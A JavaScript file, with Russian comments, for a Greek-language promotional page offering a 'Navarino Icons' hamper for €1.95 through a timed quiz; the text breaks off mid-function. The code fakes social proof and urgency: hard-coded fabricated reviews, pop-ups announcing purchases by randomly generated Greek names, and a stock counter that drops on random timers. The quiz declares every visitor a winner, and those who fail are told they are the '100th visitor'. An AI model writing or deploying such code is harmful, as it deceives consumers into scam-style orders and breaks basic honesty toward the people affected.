// Инициализация при загрузке страницы
document.addEventListener('DOMContentLoaded', function() {
  initializeApp();
});

// Основные переменные
let currentSlide = 0;
let stockCount = Math.floor(Math.random() * 51) + 30; // Рандомно от 30 до 80
let notifications = [];
let notificationsDisabled = false; // Флаг для отключения уведомлений
let quizStarted = false; // Флаг для отслеживания начала квиза
let quizTimer = null; // Таймер квиза
let quizTimeLeft = 180; // Время квиза в секундах (3 минуты)
let quizCompleted = false; // Флаг завершения квиза
let reviews = [
  {
    id: 1,
    name: "Μαρία Παπαδοπούλου",
    city: "Αθήνα",
    rating: 5,
    comment: "Τα παραγγείλα για τη γιαγιά μου και είναι τρελή από χαρά! Η συσκευασία ήταν τέλεια.",
    image: "assets/c1.webp",
    productImage: "assets/c1.webp",
    date: "2 ημέρες πριν"
  },
  {
    id: 2,
    name: "Γιάννης Κωνσταντίνου",
    city: "Θεσσαλονίκη",
    rating: 5,
    comment: "Παιδιά, αυτό είναι το καλύτερο που έχω αγοράσει φέτος! Η ποιότητα είναι εξαιρετική.",
    image: "assets/sl4.webp",
    productImage: "",
    date: "3 ημέρες πριν"
  },
  {
    id: 3,
    name: "Ελένη Δημητρίου",
    city: "Πάτρα",
    rating: 5,
    comment: "Μόλις έλαβα το πακέτο και είμαι έκπληκτη! Η γεύση είναι απίστευτη.",
    image: "assets/c2.webp",
    productImage: "",
    date: "5 ημέρες πριν"
  },
  {
    id: 4,
    name: "Νίκος Παπαδόπουλος",
    city: "Ηράκλειο",
    rating: 5,
    comment: "Όλοι οι γείτονες μου ζητάνε πού τα βρήκα! Είναι τόσο καλά!",
    image: "",
    productImage: "",
    date: "1 εβδομάδα πριν"
  },
  {
    id: 5,
    name: "Αννα Κωνσταντίνου",
    city: "Λάρισα",
    rating: 5,
    comment: "Η γυναίκα μου λέει ότι φαίνονται σαν να τα έφεραν απευθείας από την Ελλάδα!",
    image: "",
    productImage: "",
    date: "1 εβδομάδα πριν"
  },
  {
    id: 6,
    name: "Δημήτρης Αλεξίου",
    city: "Βόλος",
    rating: 5,
    comment: "Πώς είναι το μέλι; Είναι πραγματικά φυσικό ανθόνεκταρ όπως λένε;",
    image: "assets/c3.webp",
    productImage: "",
    date: "2 εβδομάδες πριν"
  }
];

// Функция для запуска квиза
function startQuiz() {
  // Устанавливаем флаг начала квиза
  quizStarted = true;
  quizCompleted = false;
  quizTimeLeft = 180; // Сбрасываем время
  
  // Скрываем фиксированную кнопку "Начать тест" навсегда
  const fixedBottomButton = document.querySelector('.fixed-bottom-test-button');
  if (fixedBottomButton) {
    fixedBottomButton.style.display = 'none';
  }
  
  // Сбрасываем состояние всех вопросов
  resetAllQuestions();
  
  // Скрываем все секции
  document.querySelectorAll('section, .offer-info, .hero-button, .stock-section').forEach(el => {
    if (el) el.style.display = 'none';
  });
  
  // Показываем секцию квиза
  const quizSection = document.getElementById('quiz-section');
  if (quizSection) {
    quizSection.style.display = 'block';
  }
  
  // Сбрасываем прогресс
  document.getElementById('currentQuestion').textContent = '1';
  document.getElementById('quizProgress').style.width = '16.67%';
  
  // Запускаем таймер
  startQuizTimer();
  
  // Прокручиваем к началу страницы
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Функция для сброса состояния всех вопросов
function resetAllQuestions() {
  for (let i = 1; i <= 6; i++) {
    resetQuestionState(i);
  }
  
  // Показываем первый вопрос
  document.querySelectorAll('.quiz-question').forEach(q => q.classList.remove('active'));
  document.querySelector('[data-question="1"]').classList.add('active');
}

// Функция для запуска таймера квиза
function startQuizTimer() {
  // Очищаем предыдущий таймер если есть
  if (quizTimer) {
    clearInterval(quizTimer);
  }
  
  // Обновляем отображение времени
  updateTimerDisplay();
  
  // Запускаем таймер
  quizTimer = setInterval(() => {
    quizTimeLeft--;
    updateTimerDisplay();
    
    // Проверяем время
    if (quizTimeLeft <= 0) {
      clearInterval(quizTimer);
      quizTimer = null;
      timeUp();
    }
  }, 1000);
}

// Функция для обновления отображения таймера
function updateTimerDisplay() {
  const timerDisplay = document.getElementById('quizTimer');
  if (!timerDisplay) return;
  
  const minutes = Math.floor(quizTimeLeft / 60);
  const seconds = quizTimeLeft % 60;
  const timeString = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  
  timerDisplay.textContent = timeString;
  
  // Добавляем классы для предупреждений
  timerDisplay.classList.remove('warning', 'danger');
  if (quizTimeLeft <= 60 && quizTimeLeft > 30) {
    timerDisplay.classList.add('warning');
  } else if (quizTimeLeft <= 30) {
    timerDisplay.classList.add('danger');
  }
}

// Функция для обработки окончания времени
function timeUp() {
  if (quizCompleted) return; // Если квиз уже завершен, не показываем сообщение
  
  // Показываем сообщение об окончании времени
  const quizContainer = document.getElementById('quizContainer');
  if (quizContainer) {
    quizContainer.innerHTML = `
      <div class="time-up-message">
        <h3>⏰ Χρόνος τελείωσε!</h3>
        <p>Δεν προλάβατε να ολοκληρώσετε το κουίζ εγκαίρως. Μπορείте να δοκιμάσετε ξανά!</p>
        <button class="cta-button" onclick="startQuiz()">Δοκιμάστε Ξανά</button>
      </div>
    `;
  }
  
  // Скрываем прогресс и таймер
  const quizProgress = document.querySelector('.quiz-progress');
  if (quizProgress) {
    quizProgress.style.display = 'none';
  }
}

// Инициализация приложения
function initializeApp() {
  setTimestamp();
  loadReviews();
  startSlider();
  startStockCounter();
  setupEventListeners();
  setupQuiz();
  
  // Инициализируем прогресс-бар
  updateStockDisplay();
  
  // Показываем первое уведомление через 3 секунды после загрузки (если квиз не начался)
  setTimeout(() => {
    if (!quizStarted) {
      addNotification();
    }
  }, 3000);
}

// Установка временной метки для заказа
function setTimestamp() {
  const timestampElement = document.getElementById('orderTimestamp');
  if (timestampElement) {
    timestampElement.value = new Date().toISOString();
  }
}

// Загрузка отзывов
function loadReviews() {
  const savedReviews = JSON.parse(localStorage.getItem('userReviews') || '[]');
  if (savedReviews.length > 0) {
    reviews = [...savedReviews, ...reviews];
  }
  renderReviews();
}

// Рендеринг отзывов
function renderReviews() {
  const reviewsGrid = document.getElementById('reviewsGrid');
  if (!reviewsGrid) return; // Проверяем существование элемента
  
  reviewsGrid.innerHTML = reviews.map(review => `
    <div class="review-card">
      <div class="review-header">
        <div class="user-info">
          <h4>${review.name}</h4>
          <p>${review.city}</p>
          <div class="rating">${'★'.repeat(review.rating)}</div>
        </div>
      </div>
      <p class="review-comment">${review.comment}</p>
      ${review.image ? `<img src="${review.image}" alt="Product" class="review-product-image" />` : ''}
      <span class="review-date">${review.date}</span>
    </div>
  `).join('');
}

// Слайдер продуктов
function startSlider() {
  const slides = document.querySelectorAll('.slide');
  const dots = document.querySelectorAll('.dot');
  
  if (slides.length === 0 || dots.length === 0) return;
  
  setInterval(() => {
    currentSlide = (currentSlide + 1) % slides.length;
    setSlide(currentSlide);
  }, 3000);
  
  // Настройка свайпа для слайдера
  setupSliderSwipe();
}

// Установка слайда
function setSlide(index) {
  const slides = document.querySelectorAll('.slide');
  const dots = document.querySelectorAll('.dot');
  
  if (slides.length === 0 || dots.length === 0) return;
  
  currentSlide = index;
  
  // Скрываем все слайды
  slides.forEach(slide => {
    if (slide && slide.classList) {
      slide.classList.remove('active');
    }
  });
  
  // Убираем активный класс со всех точек
  dots.forEach(dot => {
    if (dot && dot.classList) {
      dot.classList.remove('active');
    }
  });
  
  // Показываем нужный слайд и активируем точку
  if (slides[index] && slides[index].classList) {
    slides[index].classList.add('active');
  }
  if (dots[index] && dots[index].classList) {
    dots[index].classList.add('active');
  }
}

// Настройка свайпа для слайдера
function setupSliderSwipe() {
  const sliderContainer = document.querySelector('.slider-container');
  if (!sliderContainer) return;
  
  let startX = 0;
  let currentX = 0;
  let isDragging = false;
  
  // Touch события
  sliderContainer.addEventListener('touchstart', function(e) {
    startX = e.touches[0].clientX;
    isDragging = true;
  });
  
  sliderContainer.addEventListener('touchmove', function(e) {
    if (!isDragging) return;
    currentX = e.touches[0].clientX;
    const diff = currentX - startX;
    
    // Добавляем визуальный эффект перетаскивания
    const activeSlide = document.querySelector('.slide.active');
    if (activeSlide) {
      activeSlide.style.transform = `translateX(${diff * 0.3}px)`;
    }
  });
  
  sliderContainer.addEventListener('touchend', function(e) {
    if (!isDragging) return;
    isDragging = false;
    
    const slides = document.querySelectorAll('.slide');
    if (slides.length === 0) return;
    
    const diff = currentX - startX;
    const threshold = 50; // Минимальное расстояние для свайпа
    
    if (Math.abs(diff) > threshold) {
      if (diff > 0) {
        // Свайп вправо - предыдущий слайд
        const prevSlide = (currentSlide - 1 + slides.length) % slides.length;
        setSlide(prevSlide);
      } else {
        // Свайп влево - следующий слайд
        const nextSlide = (currentSlide + 1) % slides.length;
        setSlide(nextSlide);
      }
    }
    
    // Сбрасываем трансформацию
    const activeSlide = document.querySelector('.slide.active');
    if (activeSlide) {
      activeSlide.style.transform = 'translateX(0)';
    }
  });
  
  // Mouse события для десктопа
  sliderContainer.addEventListener('mousedown', function(e) {
    startX = e.clientX;
    isDragging = true;
    sliderContainer.style.cursor = 'grabbing';
  });
  
  sliderContainer.addEventListener('mousemove', function(e) {
    if (!isDragging) return;
    currentX = e.clientX;
    const diff = currentX - startX;
    
    const activeSlide = document.querySelector('.slide.active');
    if (activeSlide) {
      activeSlide.style.transform = `translateX(${diff * 0.3}px)`;
    }
  });
  
  sliderContainer.addEventListener('mouseup', function(e) {
    if (!isDragging) return;
    isDragging = false;
    sliderContainer.style.cursor = 'grab';
    
    const slides = document.querySelectorAll('.slide');
    if (slides.length === 0) return;
    
    const diff = currentX - startX;
    const threshold = 50;
    
    if (Math.abs(diff) > threshold) {
      if (diff > 0) {
        const prevSlide = (currentSlide - 1 + slides.length) % slides.length;
        setSlide(prevSlide);
      } else {
        const nextSlide = (currentSlide + 1) % slides.length;
        setSlide(nextSlide);
      }
    }
    
    // Сбрасываем трансформацию
    const activeSlide = document.querySelector('.slide.active');
    if (activeSlide) {
      activeSlide.style.transform = 'translateX(0)';
    }
  });
}

// Счетчик остатков
function startStockCounter() {
  // Запускаем уведомления каждые 10-40 секунд
  setInterval(() => {
    if (stockCount > 1 && !notificationsDisabled && !quizStarted) {
      stockCount--;
      updateStockDisplay();
      
      // Добавляем уведомление о заказе
      addNotification();
    }
  }, Math.random() * 30000 + 10000); // 10-40 секунд рандомно
  
  // Дополнительно запускаем уведомления каждые 15-35 секунд для большей активности
  setInterval(() => {
    if (stockCount > 1 && !notificationsDisabled && !quizStarted) {
      stockCount--;
      updateStockDisplay();
      addNotification();
    }
  }, Math.random() * 20000 + 15000); // 15-35 секунд рандомно
}

// Обновление отображения остатков
function updateStockDisplay() {
  console.log('Обновление stockCount:', stockCount);
  document.getElementById('stockCount').textContent = stockCount;
  const progressFill = document.getElementById('progressFill');
  
  // Правильно рассчитываем ширину прогресс-бара (от 100 до 0)
  const progressPercentage = Math.max(0, (stockCount / 100) * 100);
  console.log('Прогресс-бар:', progressPercentage + '%');
  progressFill.style.width = `${progressPercentage}%`;
  
  // Добавляем анимацию потряхивания
  progressFill.classList.add('shake');
  setTimeout(() => {
    progressFill.classList.remove('shake');
  }, 500);
}

// Добавление уведомления
function addNotification() {
  // Проверяем, можно ли показывать уведомления
  if (notificationsDisabled || quizStarted) {
    return;
  }
  
  console.log('Добавление уведомления, текущий stockCount:', stockCount);
  const greekNames = [
    'Νίκος', 'Μαρία', 'Γιάννης', 'Ελένη', 'Κώστας', 'Άννα', 'Δημήτρης', 'Σοφία',
    'Αλέξανδρος', 'Ευαγγελία', 'Μιχάλης', 'Αγγελική', 'Γεώργιος', 'Παρασκευή', 'Ανδρέας', 'Ελένη',
    'Ιωάννης', 'Αικατερίνη', 'Παναγιώτης', 'Δέσποινα', 'Βασίλης', 'Χριστίνα', 'Εμμανουήλ', 'Αντιγόνη',
    'Δημήτριος', 'Ειρήνη', 'Χρήστος', 'Ζωή', 'Αντώνης', 'Αναστασία', 'Σπύρος', 'Ελένη'
  ];
  const greekCities = [
    'Αθήνα', 'Θεσσαλόνικη', 'Πάτρα', 'Ηράκλειο', 'Λάρισα', 'Βόλος', 'Ιωάννινα', 'Καβάλα',
    'Ρόδος', 'Χανιά', 'Κέρκυρα', 'Μύκονος', 'Σαντορίνη', 'Νάξος', 'Πάρος', 'Κρήτη',
    'Πελοπόννησος', 'Μακεδονία', 'Θεσσαλία', 'Ήπειρος', 'Στερεά Ελλάδα', 'Αιγαίο', 'Ιόνιο', 'Κυκλάδες'
  ];
  
  // Выбираем случайное имя и город, которых еще не было в последних уведомлениях
  let randomName, randomCity;
  let attempts = 0;
  do {
    randomName = greekNames[Math.floor(Math.random() * greekNames.length)];
    randomCity = greekCities[Math.floor(Math.random() * greekCities.length)];
    attempts++;
    // Предотвращаем бесконечный цикл
    if (attempts > 10) break;
  } while (notifications.some(n => n.message.includes(randomName) && n.message.includes(randomCity)));
  
  const notification = {
    id: Date.now(),
    message: `${randomName} από ${randomCity} παρήγγειλε 1 σετ`,
    timestamp: Date.now()
  };
  
  notifications.push(notification);
  showNotification(notification);
  
  // Автоматическое скрытие через 6 секунд
  setTimeout(() => {
    autoHideNotification(notification.id);
  }, 6000);
  
  // Ограничиваем количество уведомлений в памяти
  if (notifications.length > 20) {
    notifications.shift();
  }
}

// Показ уведомления
function showNotification(notification) {
  const notificationsContainer = document.getElementById('notifications');
  const notificationElement = document.createElement('div');
  notificationElement.className = 'notification';
  notificationElement.innerHTML = `
    <span>🔔 ${notification.message}</span>
    <button onclick="hideNotification(${notification.id})">×</button>
  `;
  notificationElement.id = `notification-${notification.id}`;
  notificationsContainer.appendChild(notificationElement);
}

// Автоматическое скрытие уведомления (не отключает уведомления)
function autoHideNotification(id) {
  const notificationElement = document.getElementById(`notification-${id}`);
  if (notificationElement) {
    notificationElement.remove();
    notifications = notifications.filter(n => n.id !== id);
  }
}

// Скрытие уведомления пользователем (отключает уведомления)
function hideNotification(id) {
  const notificationElement = document.getElementById(`notification-${id}`);
  if (notificationElement) {
    notificationElement.remove();
    notifications = notifications.filter(n => n.id !== id);
    
    // Отключаем уведомления только если пользователь сам закрыл уведомление
    if (!notificationsDisabled) {
      notificationsDisabled = true;
      console.log('Уведомления отключены после первого закрытия пользователем');
    }
  }
}

// Настройка обработчиков событий
function setupEventListeners() {
  // Форма отзывов
  const reviewForm = document.getElementById('reviewForm');
  if (reviewForm) {
    reviewForm.addEventListener('submit', handleReviewSubmit);
  }
  
  // Форма заказа
  const orderForm = document.getElementById('orderForm');
  if (orderForm) {
    orderForm.addEventListener('submit', handleOrderSubmit);
  }
  
  // Загрузка изображения для отзыва
  const reviewImage = document.getElementById('reviewImage');
  if (reviewImage) {
    reviewImage.addEventListener('change', handleImageUpload);
  }
  
  // Настройка свайпа для уведомлений
  setupNotificationSwipe();
  
  // Настройка квиза
  setupQuiz();
  
  // Настройка кнопки прокрутки вверх
  setupScrollToTop();
  
  // Заполнение UTM-параметров
  fillUTMParameters();
}

// Обработка загрузки изображения
function handleImageUpload(e) {
  const file = e.target.files[0];
  if (file) {
    const reader = new FileReader();
    reader.onload = function(e) {
      const imagePreview = document.getElementById('imagePreview');
      if (imagePreview) {
        imagePreview.innerHTML = `<img src="${e.target.result}" alt="Preview" />`;
      }
    };
    reader.readAsDataURL(file);
  }
}

// Настройка свайпа для уведомлений
function setupNotificationSwipe() {
  let startX = 0;
  let currentX = 0;
  
  document.addEventListener('touchstart', function(e) {
    if (e.target.closest('.notification')) {
      startX = e.touches[0].clientX;
    }
  });
  
  document.addEventListener('touchmove', function(e) {
    if (e.target.closest('.notification')) {
      currentX = e.touches[0].clientX;
      const notification = e.target.closest('.notification');
      const diff = currentX - startX;
      
      if (Math.abs(diff) > 10) {
        notification.style.transform = `translateX(${diff}px)`;
      }
    }
  });
  
  document.addEventListener('touchend', function(e) {
    if (e.target.closest('.notification')) {
      const notification = e.target.closest('.notification');
      const diff = currentX - startX;
      
      if (Math.abs(diff) > 100) {
        if (diff > 0) {
          notification.classList.add('swipe-right');
        } else {
          notification.classList.add('swipe-left');
        }
        
        setTimeout(() => {
          const id = parseInt(notification.id.replace('notification-', ''));
          hideNotification(id);
        }, 300);
      } else {
        notification.style.transform = 'translateX(0)';
      }
    }
  });
}

// Обработка отправки отзыва
function handleReviewSubmit(e) {
  e.preventDefault();
  
  const imageFile = document.getElementById('reviewImage').files[0];
  
  if (imageFile) {
    const reader = new FileReader();
    reader.onload = function(e) {
      const imageUrl = e.target.result;
      saveReview(imageUrl);
    };
    reader.readAsDataURL(imageFile);
  } else {
    saveReview(null);
  }
}

// Функция для получения случайного фото товара
function getRandomProductImage() {
  const productImages = [
    'assets/0008861_navarino-icons-collection-hamper-8-items.avif',
    'assets/0008860_navarino-icons-collection-hamper-8-items.avif',
    'assets/0008859_navarino-icons-collection-hamper-8-items.avif',
    'assets/0008857_navarino-icons-collection-hamper-8-items.avif',
    'assets/0008856_navarino-icons-collection-hamper-8-items.avif',
    'assets/0008854_navarino-icons-collection-hamper-8-items.avif',
    'assets/0009304_navarino-icons-collection-hamper-8-items.avif',
    'assets/picka_logo.webp'
  ];
  return productImages[Math.floor(Math.random() * productImages.length)];
}

// Функция для генерации случайного греческого комментария
function getRandomGreekComment() {
  const comments = [
    "Τα παραγγείλα για τη γιαγιά μου και είναι τρελή από χαρά!",
    "Η ποιότητα είναι εξαιρετική!",
    "Μόλις έλαβα το πακέτο και είμαι έκπληκτη!",
    "Η γεύση είναι απίστευτη!",
    "Όλοι οι γείτονες μου ζητάνε πού τα βρήκα!",
    "Η συσκευασία ήταν τέλεια!",
    "Είναι τόσο καλά!",
    "Αξίζει κάθε ευρώ!",
    "Σίγουρα θα παραγγείλω ξανά!",
    "Παιδιά, αυτό είναι το καλύτερο που έχω αγοράσει φέτος!"
  ];
  return comments[Math.floor(Math.random() * comments.length)];
}

// Сохранение отзыва
function saveReview(imageUrl) {
  const reviewForm = document.getElementById('reviewForm');
  const imagePreview = document.getElementById('imagePreview');
  
  if (!reviewForm) return;
  
  const userComment = document.getElementById('reviewComment').value;
  const review = {
    id: Date.now(),
    name: document.getElementById('reviewName').value,
    city: document.getElementById('reviewCity').value,
    rating: parseInt(document.getElementById('reviewRating').value),
    comment: userComment || getRandomGreekComment(), // Используем комментарий пользователя или случайный
    image: imageUrl,
    date: "Μόλις τώρα"
  };
  
  // Сохраняем в localStorage
  const savedReviews = JSON.parse(localStorage.getItem('userReviews') || '[]');
  savedReviews.push(review);
  localStorage.setItem('userReviews', JSON.stringify(savedReviews));
  
  // Добавляем в массив и перерендериваем
  reviews.unshift(review);
  renderReviews();
  
  // Очищаем форму
  reviewForm.reset();
  if (imagePreview) {
    imagePreview.innerHTML = '';
  }
  
   
}

// Обработка отправки заказа
function handleOrderSubmit(e) {
  // НЕ отменяем отправку формы - она должна уйти на api.php!
  // e.preventDefault(); // УБРАНО!
  
  // Можно добавить логику для показа уведомления об успешной отправке
  // но НЕ отменять отправку формы
  
  // Очищаем форму после успешной отправки
  // document.getElementById('orderForm').reset(); // УБРАНО!
  // setTimestamp(); // УБРАНО!
}

// Показать квиз (скрыть главную страницу)
function scrollToForm() {
  // Скрываем главную страницу
  document.querySelector('.hero').style.display = 'none';
  document.querySelector('.stock-section').style.display = 'none';
  document.querySelector('.product-info-section').style.display = 'none';
  document.querySelector('.faq-section').style.display = 'none';
  document.querySelector('.reviews-section').style.display = 'none';
  document.querySelector('.footer').style.display = 'none';
  
  // Показываем квиз
  document.getElementById('quiz').style.display = 'block';
  
  // Прокручиваем к началу страницы
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Настройка квиза
function setupQuiz() {
  const quizOptions = document.querySelectorAll('.quiz-option');
  quizOptions.forEach(option => {
    option.addEventListener('click', handleQuizAnswer);
  });
  
  // Кнопка показа формы заказа
  document.getElementById('showOrderForm').addEventListener('click', showOrderForm);
  
  // Вторая кнопка показа формы заказа
  document.getElementById('showOrderForm2').addEventListener('click', showOrderForm);
}

// Обработка ответа на вопрос квиза
function handleQuizAnswer(e) {
  const selectedOption = e.target;
  const question = selectedOption.closest('.quiz-question');
  const isCorrect = selectedOption.dataset.correct === 'true';
  
  // Убираем предыдущие отметки
  question.querySelectorAll('.quiz-option').forEach(opt => {
    opt.classList.remove('selected', 'correct', 'incorrect');
  });
  
  // Отмечаем выбранный ответ
  selectedOption.classList.add('selected');
  
  // Показываем правильность ответа
  if (isCorrect) {
    selectedOption.classList.add('correct');
  } else {
    selectedOption.classList.add('incorrect');
    // Показываем правильный ответ
    const correctOption = question.querySelector('[data-correct="true"]');
    correctOption.classList.add('correct');
  }
  
  // Отключаем все кнопки в этом вопросе
  const options = question.querySelectorAll('.quiz-option');
  options.forEach(opt => opt.style.pointerEvents = 'none');
  
  // Переходим к следующему вопросу через 1.5 секунды
  setTimeout(() => {
    const currentQuestionNum = parseInt(question.dataset.question);
    if (currentQuestionNum < 6) {
      showQuestion(currentQuestionNum + 1);
    } else {
      showQuizResult();
    }
  }, 1500);
}

// Показать вопрос
function showQuestion(questionNum) {
  // Скрываем все вопросы
  document.querySelectorAll('.quiz-question').forEach(q => q.classList.remove('active'));
  
  // Показываем нужный вопрос
  document.querySelector(`[data-question="${questionNum}"]`).classList.add('active');
  
  // Обновляем прогресс
  document.getElementById('currentQuestion').textContent = questionNum;
  document.getElementById('quizProgress').style.width = `${(questionNum / 6) * 100}%`;
}

// Перейти к предыдущему вопросу
function previousQuestion(questionNum) {
  if (questionNum >= 1 && questionNum <= 6) {
    // Сбрасываем состояние вопроса, к которому возвращаемся
    resetQuestionState(questionNum);
    
    // Сбрасываем состояние всех последующих вопросов
    for (let i = questionNum + 1; i <= 6; i++) {
      resetQuestionState(i);
    }
    
    // Показываем вопрос
    showQuestion(questionNum);
  }
}

// Сбросить состояние конкретного вопроса
function resetQuestionState(questionNum) {
  const question = document.querySelector(`[data-question="${questionNum}"]`);
  if (!question) return;
  
  // Убираем все классы состояния с кнопок
  const options = question.querySelectorAll('.quiz-option');
  options.forEach(option => {
    option.classList.remove('selected', 'correct', 'incorrect');
    option.style.pointerEvents = 'auto'; // Разблокируем кнопки
  });
  

}

// Показать результат квиза
function showQuizResult() {
  // Останавливаем таймер и устанавливаем флаг завершения
  if (quizTimer) {
    clearInterval(quizTimer);
    quizTimer = null;
  }
  quizCompleted = true;
  
  // Правильно подсчитываем правильные ответы
  let correctAnswers = 0;
  let totalQuestions = 6;
  let userAnswers = [];
  
  // Проходим по всем вопросам и собираем ответы пользователя
  for (let i = 1; i <= totalQuestions; i++) {
    const question = document.querySelector(`[data-question="${i}"]`);
    const selectedOption = question.querySelector('.quiz-option.selected');
    const correctOption = question.querySelector('[data-correct="true"]');
    
    if (selectedOption && selectedOption.dataset.correct === 'true') {
      correctAnswers++;
    }
    
    userAnswers.push({
      questionNum: i,
      questionText: question.querySelector('p').textContent,
      userAnswer: selectedOption ? selectedOption.textContent : 'Δεν απαντήθηκε',
      correctAnswer: correctOption.textContent,
      isCorrect: selectedOption && selectedOption.dataset.correct === 'true'
    });
  }
  
  const resultTitle = document.getElementById('resultTitle');
  const resultMessage = document.getElementById('resultMessage');
  
  // Показываем результат с учетом времени
  if (correctAnswers >= 3 && quizTimeLeft > 0) {
    resultTitle.textContent = '🎉 Συγχαρητήρια! Κερδίσατε!';
    resultMessage.textContent = `Απαντήσατε σωστά σε ${correctAnswers} από 6 ερωτήσεις εγκαίρως! Τώρα μπορείτε να παραγγείλετε το σετ Navarino Icons μόνο για €1.95!`;
  } else if (correctAnswers >= 3 && quizTimeLeft <= 0) {
    resultTitle.textContent = '⏰ Χρόνος τελείωσε!';
    resultMessage.textContent = `Απαντήσατε σωστά σε ${correctAnswers} από 6 ερωτήσεις, αλλά δεν προλάβατε εγκαίρως. Μπορείτε να δοκιμάσετε ξανά!`;
  } else {
    resultTitle.textContent = '🎁 Συγχαρητήρια! Είστε ο 100ος επισκέπτης!';
    resultMessage.textContent = `Απαντήσατε σωστά σε ${correctAnswers} από 6 ερωτήσεις. Αλλά είστε τυχερός επισκέπτης! Σας δίνουμε ειδική ευκαιρία να παραγγείλετε το σετ Navarino Icons μόνο για €1.95!`;
  }
  
  // Скрываем заголовок квиза
  const quizHeader = document.querySelector('.quiz-header');
  if (quizHeader) {
    quizHeader.style.display = 'none';
  }
  
  // Показываем детальный результат с вопросами и ответами
  showDetailedResults(userAnswers, correctAnswers);
  
  document.getElementById('quizResult').style.display = 'block';
  document.getElementById('quizContainer').style.display = 'none';
  document.querySelector('.quiz-progress').style.display = 'none';
}

// Показать детальные результаты с вопросами и ответами
function showDetailedResults(userAnswers, correctAnswers) {
  const quizResult = document.getElementById('quizResult');
  
  // Создаем HTML для детальных результатов
  let detailedResultsHTML = `
    <div class="detailed-results">
      <h4>📊 Αναλυτικά Αποτελέσματα:</h4>
      <div class="results-summary">
        <p><strong>Σωστές απαντήσεις:</strong> ${correctAnswers}/6</p>
        
      </div>
      <div class="questions-review">
        <h5>Ερωτήσεις και Απαντήσεις:</h5>
  `;
  
  userAnswers.forEach(answer => {
    const statusIcon = answer.isCorrect ? '✅' : '❌';
    const statusClass = answer.isCorrect ? 'correct-answer' : 'incorrect-answer';
    
    detailedResultsHTML += `
      <div class="question-review ${statusClass}">
        <div class="question-header">
          <span class="status-icon">${statusIcon}</span><span class="question-number">Ερώτηση ${answer.questionNum}</span>
        </div>
        <p class="question-text">${answer.questionText}</p>
        <div class="answer-details">
          <p><strong>Η απάντησή σας:</strong> <span class="user-answer">${answer.userAnswer}</span></p>
          <p><strong>Σωστή απάντηση:</strong> <span class="correct-answer-text">${answer.correctAnswer}</span></p>
        </div>
      </div>
    `;
  });
  
  // Добавляем кнопку переключения и закрываем div
  detailedResultsHTML += `
      </div>
      <div class="detailed-results-toggle">
        <button class="toggle-btn" onclick="toggleDetailedResults()" title="Δείτε Όλα τα Αποτελέσματα">
          ▼
        </button>
      </div>
    </div>
  `;

  // Добавляем детальные результаты в существующий элемент
  const existingDetailedResults = quizResult.querySelector('.detailed-results');
  if (existingDetailedResults) {
    existingDetailedResults.remove();
  }
  
  // Вставляем после resultMessage
  const resultMessage = document.getElementById('resultMessage');
  
  // Добавляем детальные результаты
  resultMessage.insertAdjacentHTML('afterend', detailedResultsHTML);
  
  // Инициализируем состояние (свернуто)
  const detailedResults = quizResult.querySelector('.detailed-results');
  if (detailedResults) {
    detailedResults.classList.remove('expanded');
    
    // Добавляем обработчик клика на весь блок detailed-results
    detailedResults.style.cursor = 'pointer';
    detailedResults.addEventListener('click', function(e) {
      // Не срабатываем, если клик был по кнопке
      if (e.target.classList.contains('toggle-btn')) {
        return;
      }
      toggleDetailedResults();
    });
  }
  
  // Проверяем, что кнопка добавлена
  const toggleBtn = quizResult.querySelector('.toggle-btn');
  if (toggleBtn) {
    // Кнопка найдена
  }
}

// Переключить отображение детальных результатов
function toggleDetailedResults() {
  const quizResult = document.getElementById('quizResult');
  if (!quizResult) {
    return;
  }
  
  const detailedResults = quizResult.querySelector('.detailed-results');
  const toggleBtn = quizResult.querySelector('.toggle-btn');
  
  if (!detailedResults || !toggleBtn) {
    return;
  }
  
  if (detailedResults.classList.contains('expanded')) {
    // Сворачиваем
    detailedResults.classList.remove('expanded');
    toggleBtn.textContent = '▼';
    toggleBtn.title = 'Δείτε Όλα τα Αποτελέσματα';
    toggleBtn.style.background = 'linear-gradient(135deg, #6c757d, #5a6268)';
  } else {
    // Разворачиваем
    detailedResults.classList.add('expanded');
    toggleBtn.textContent = '▲';
    toggleBtn.title = 'Απόκρυψη Αποτελεσμάτων';
    toggleBtn.style.background = 'linear-gradient(135deg, #6c757d, #5a6268)';
  }
}

// Делаем функции глобально доступными
window.toggleDetailedResults = toggleDetailedResults;
window.showOrderForm = showOrderForm;

// Показать форму заказа (скрыть квиз и header)
function showOrderForm() {
  // Скрываем квиз
  document.getElementById('quiz-section').style.display = 'none';
  
  // Скрываем header
  document.querySelector('.header').style.display = 'none';
  
  // Показываем форму заказа
  document.getElementById('order-form').style.display = 'block';
  
  // Прокручиваем к началу страницы
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Вернуться на главную страницу
function backToMain() {
  // Останавливаем таймер квиза
  if (quizTimer) {
    clearInterval(quizTimer);
    quizTimer = null;
  }
  
  // Сбрасываем флаги квиза
  quizStarted = false;
  quizCompleted = false;
  quizTimeLeft = 180;
  
  // Скрываем квиз
  document.getElementById('quiz-section').style.display = 'none';
  
  // Показываем все секции главной страницы
  document.querySelectorAll('section, .offer-info, .hero-button, .stock-section').forEach(el => {
    if (el) el.style.display = 'block';
  });
  
  // Фиксированная кнопка остается скрытой навсегда после старта квиза
  // Не показываем её снова
  
  // Прокручиваем к началу страницы
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Вернуться к квизу
function backToQuiz() {
  // Скрываем форму заказа
  document.getElementById('order-form').style.display = 'none';
  
  // Показываем header
  document.querySelector('.header').style.display = 'block';
  
  // Показываем квиз
  document.getElementById('quiz-section').style.display = 'block';
  
  // Перезапускаем таймер квиза
  if (!quizTimer && quizStarted) {
    startQuizTimer();
  }
  
  // Прокручиваем к началу страницы
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// Обновление отображения остатков при загрузке
updateStockDisplay();

// Настройка кнопки прокрутки вверх и фиксированной кнопки
function setupScrollToTop() {
  const scrollToTopButton = document.getElementById('scrollToTop');
  const fixedBottomButton = document.querySelector('.fixed-bottom-test-button');
  
  if (!scrollToTopButton) return;
  
  // Показываем кнопку при прокрутке вниз
  window.addEventListener('scroll', function() {
    // Кнопка прокрутки вверх
    if (window.pageYOffset > 300) {
      scrollToTopButton.classList.add('show');
    } else {
      scrollToTopButton.classList.remove('show');
    }
    
    // Фиксированная кнопка "Начать тест" - показываем после скролла 2-3 экранов
    // Но только если квиз еще не был запущен
